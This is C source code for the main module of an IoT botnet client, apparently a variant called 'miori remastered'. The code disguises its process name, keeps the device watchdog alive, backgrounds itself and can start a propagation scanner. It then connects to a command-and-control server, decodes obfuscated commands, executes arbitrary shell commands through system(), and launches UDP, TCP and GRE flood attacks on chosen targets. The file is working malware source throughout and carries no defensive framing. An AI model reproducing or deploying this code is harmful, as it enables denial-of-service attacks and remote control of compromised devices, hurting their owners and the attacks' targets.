#define _GNSOURCE

#include <stdlib.h>
#ifdef DEBUG
#include <stdio.h>
#endif

#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "headers/rand.h"
#include "headers/table.h"
#include "headers/attack.h"
#include "headers/includes.h"
#include "headers/util.h"
#include "headers/checksum.h"
#include "headers/telnet.h"
#include "../config.h"

#define maxpids 500 // max pids to store 
// this looks vuln but theres no way were going to store more then 500 pids per device LOL.

int once = 0;
char decoded_data[1024], encoded_data[1024];

struct pids{
int pids;
char ip[100];
}pidd[maxpids];

char encodes[] = { 
		'a', 'u', 'w', 'A', 'd', 'e', 'F', 'H', 'i', 'o', 'n', 'G', 'm', 'I', 'K', 'J',
		'Y', 'B', 'v', 'c', 'x', 'g', 'y', 'h', 'P', 'p', 'q', 'Q', 'W', 'R', 'L', 'S', 
		'C', 't', 'b', 's', 'E', '2', '1', 'N', 'O', 'j', 'k', 'l', 'V', '0', 'X', 'Z', 
		'3', '4', 'D', '7', '5', 'f', 'z', 'r', '8', '6', 'M', 'U', '9', 'T', '#', '?',
		'^', '&', '=', '(', '+', ')', '%'
	};

char decodes[] = { 
		'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
		'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
		'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
		'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' ',
		'/', '|', '-', '&', ';', ':', '>'
	};
	
void decode(char *str)
{
	char decoded[512];
	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while (x < strlen(str))
	{
		for (c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
					decoded_data[i] = decodes[c];
				i++;
			}
		}
		x++;
	}

	return;
}

void encode(char *str)
{
	char encoded[512];
	int x = 0, i = 0, c;

	memset(encoded, 0, sizeof(encoded));
	while (x < strlen(str))
	{
		for (c = 0; c <= sizeof(decodes); c++)
		{
			if(str[x] == decodes[c])
			{
					encoded_data[i] = encodes[c];
				i++;
			}
		}
		x++;
	}

	return;
}

int sockprintf(int sock, char *str, int botname)
{
	    int q;
        unsigned char *buf = malloc(2048);
        memset(buf, 0, 2048);
        memcpy(buf, str, strlen(str));
        if(botname == 1)
		send(sock,buf,strlen(buf), MSG_NOSIGNAL);
		else{
       q = send(sock,buf,strlen(buf), MSG_NOSIGNAL);
		   send(sock,"\r\n",2, MSG_NOSIGNAL);
		}

        return q;
}

void watchdog()
{
	int wfd[7] = {0};
	int timeout = 60;
	int found = FALSE;
	
	table_unlock_val(TABLE_MISC_DOG);
	table_unlock_val(TABLE_MISC_DOG1);
	table_unlock_val(TABLE_MISC_DOG2);
	table_unlock_val(TABLE_MISC_DOG3);
	table_unlock_val(TABLE_MISC_DOG4);
	table_unlock_val(TABLE_MISC_DOG5);
	table_unlock_val(TABLE_MISC_DOG6);
 if ((wfd[0] = open(table_retrieve_val(TABLE_MISC_DOG, NULL), 2)) != -1 ||
    (wfd[1] = open(table_retrieve_val(TABLE_MISC_DOG1, NULL), 2)) != -1 ||
    (wfd[2] = open(table_retrieve_val(TABLE_MISC_DOG2, NULL), 2)) != -1 ||
	(wfd[3] = open(table_retrieve_val(TABLE_MISC_DOG3, NULL), 2)) != -1 ||
	(wfd[4] = open(table_retrieve_val(TABLE_MISC_DOG4, NULL), 2)) != -1 ||
	(wfd[5] = open(table_retrieve_val(TABLE_MISC_DOG5, NULL), 2)) != -1 ||
    (wfd[6] = open(table_retrieve_val(TABLE_MISC_DOG6, NULL), 2)) != -1)
    {
		#ifdef DEBUG
		printf("watchdog found on device, setting timeout limit.\n");
		#endif
		found = TRUE;
		    ioctl(wfd[0], 0x80045704, &timeout);
			ioctl(wfd[1], 0x80045704, &timeout);
			ioctl(wfd[2], 0x80045704, &timeout);
			ioctl(wfd[3], 0x80045704, &timeout);
			ioctl(wfd[4], 0x80045704, &timeout);
			ioctl(wfd[5], 0x80045704, &timeout);
			ioctl(wfd[6], 0x80045704, &timeout);
    }
	else
	{
	#ifdef DEBUG
    printf("watchdog not found on device moving on.\n");
    #endif
	}
	
	if(found == TRUE)
    {
        while(1)
        {
			#ifdef DEBUG
			static int i=0;
			printf("sending watchdog keep-alive order to driver for the %d time\n",i++);
			#endif
			
            ioctl(wfd[0], 0x80045705, 0);
			ioctl(wfd[1], 0x80045705, 0);
			ioctl(wfd[2], 0x80045705, 0);
			ioctl(wfd[3], 0x80045705, 0);
			ioctl(wfd[4], 0x80045705, 0);
			ioctl(wfd[5], 0x80045705, 0);
			ioctl(wfd[6], 0x80045705, 0);
            sleep(5);
        }
    }
	table_lock_val(TABLE_MISC_DOG);
	table_lock_val(TABLE_MISC_DOG1);
	table_lock_val(TABLE_MISC_DOG2);
	table_lock_val(TABLE_MISC_DOG3);
	table_lock_val(TABLE_MISC_DOG4);
	table_lock_val(TABLE_MISC_DOG5);
	table_lock_val(TABLE_MISC_DOG6);
}

int listFork(char *ipp)
{
        uint32_t parent;
		int i;
        parent = fork();
        if (parent <= 0) return parent;
		for(i=0;i<maxpids;i++)
		{
		if(pidd[i].pids == 0)
		{
		pidd[i].pids = parent;
	    strcpy(pidd[i].ip, ipp);
		break;
		}
		
		}
        return parent;
}

void attacksend(int argc, unsigned char *argv[])
{
if(!strcmp(argv[0], "RU")) {

if(argc > 4)
{

unsigned char *ip = argv[1];
int time = atoi(argv[3]), port = atoi(argv[2]), psize = atoi(argv[4]);
    if(!listFork(argv[1]))
	{
udpattack(ip, port, time, psize);
_exit(0);
 }
}
}

if(!strcmp(argv[0], "TCP"))
{
if(argc > 4)
{   
unsigned char *ip = argv[1];
int port = atoi(argv[2]), time = atoi(argv[3]), psize = atoi(argv[4]);
unsigned char *flag = argv[5];
			
 if(!listFork(argv[1]))
 {
 tcpattack(ip, port, time, psize, flag);
 _exit(0); 
 }	
} 
            
}

if(!strcmp(argv[0], "GRE"))
{
if(argc > 4)
{
unsigned char *ip = argv[1];
int port = atoi(argv[2]), time = atoi(argv[3]), psize = atoi(argv[4]);
			
 if(!listFork(argv[1]))
 {
 greattack(ip, port, time, psize);
 _exit(0); 
 }
}           
}

if(!strcmp(argv[0], "KT"))
        {
		int i=0;
			if(argc > 1)
			{
                for (i = 0; i < maxpids; i++) {
                        if(pidd[i].pids != 0 && !strcmp(pidd[i].ip,argv[1])) 
						{
                           kill(pidd[i].pids, 9);
						   pidd[i].pids = 0;
						   memset(pidd[i].ip,0,sizeof pidd[i].ip);
                        }
                }
			}
			else{
			for (i = 0; i < maxpids; i++) {
                        if(pidd[i].pids != 0) 
						{
                           kill(pidd[i].pids, 9);
						   pidd[i].pids = 0;
						   memset(pidd[i].ip,0,sizeof pidd[i].ip);
                        }
                }
			}
        }

}

int startup_connection()
{
	    struct sockaddr_in loli;
		//struct hostent *hip;
		char ipp[100];
		struct in_addr ipaddr;
		fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	long arg = fcntl(comsocket, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(comsocket, F_SETFL, arg);
		
        comsocket = socket(AF_INET, SOCK_STREAM, 0);
		
		loli.sin_family = AF_INET;
        loli.sin_port = htons(bot_port);
		//hip = gethostbyname(host);
		//ipaddr = *(struct in_addr *)(hip->h_addr);
		//strcpy(ipp,inet_ntoa(ipaddr));
        loli.sin_addr.s_addr = inet_addr(bot_ip);
       int res = connect(comsocket, (struct sockaddr *)&loli, sizeof(loli));
		if (res < 0) {
		if (errno == EINPROGRESS) {
			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(comsocket, &myset);
			if (select(comsocket+1, NULL, &myset, NULL, &tv) > 0) {
				lon = sizeof(int);
				getsockopt(comsocket, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}
	arg = fcntl(comsocket, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(comsocket, F_SETFL, arg);
	return 1;
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;
	int fd_ctrl;

    if((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(ensure_single_port);

    errno = 0;
    if(bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        if(errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;

        #ifdef DEBUG
            printf("[main] another instance is already running (errno = %d)! sending kill request...\r\n", errno);
        #endif

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(ensure_single_port);

        if(connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[main] failed to connect to fd_ctrl to request process termination\n");
            #endif
        }

        sleep(5);
        close(fd_ctrl);
        ensure_single_instance(); // Call again, so that we are now the control
    }
	else
    listen(fd_ctrl, 1);
}

int connection_start()
{
	if(comsocket)
	{
		close(comsocket);
		comsocket=0;
	}
	if(!startup_connection()) return 1;
	return 0;
}

int main(int argc, char *argv[])
{
	ensure_single_instance();
	char yeet[100] = {" "};
	prctl(PR_SET_NAME, yeet);
	char buf[4096];
	char msgline[200];
	char joinname[200];
	int n;
	
		table_init();
		watchdog();
		strcpy(msgline,"miori remastered infection successful!! if u wanna see source here: https://root_senpai.selly.store/\r\n");
	    write(1,msgline,strlen(msgline));
		rand_init();
		sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
		if(fork() > 0) return 0;
		 setsid();
		 #ifdef REP_SENPAI
		 scanner_init();
		 #endif
        while(1)
        {
			if(connection_start()) {sleep(2); continue;}
			    strcpy(joinname,"fftt:");
				if(argc > 1)
				strcat(joinname,argv[1]);
			    else
				strcat(joinname,"(null)");
				sockprintf(comsocket,joinname,0);
				
				if(once == 0)
				{
				memset(argv[0],0,sizeof argv[0]);
				memcpy(argv[0],"  ",2);
				once = 1;
				}
        while(read(comsocket, buf, sizeof(buf)))
        {
			memset(decoded_data,0,sizeof(decoded_data));
		    decode(buf);
			strcpy(buf,decoded_data);

		if(strlen(buf) < 1024)
		{
			if(strstr(buf,"shell"))
			{
			memmove(buf, buf+6, strlen(buf));
			system(buf);
			}
			
			if(!strcmp(buf, "KILLBOT"))
	           kill(getpid(),9);//kill our self if cnc says so...
		   
	     int r; 
	     int argcount = 0;
		 unsigned char *buffer[12+1] = {0};
		 char *strr;
        for(strr = strtok(buf, " "); strr != NULL; strr = strtok(NULL, " "))
		{
		buffer[argcount++] = malloc(strlen(strr+1));
        memcpy(buffer[argcount-1], strr,strlen(strr));
		if(argcount >12){argcount=0; break;}
		}

         if(argcount > 0) attacksend(argcount, buffer);
		 memset(buffer,0,sizeof buffer);
        }
		memset(decoded_data,0,sizeof(decoded_data));
		memset(buf,0,sizeof buf);	
	}
}
}
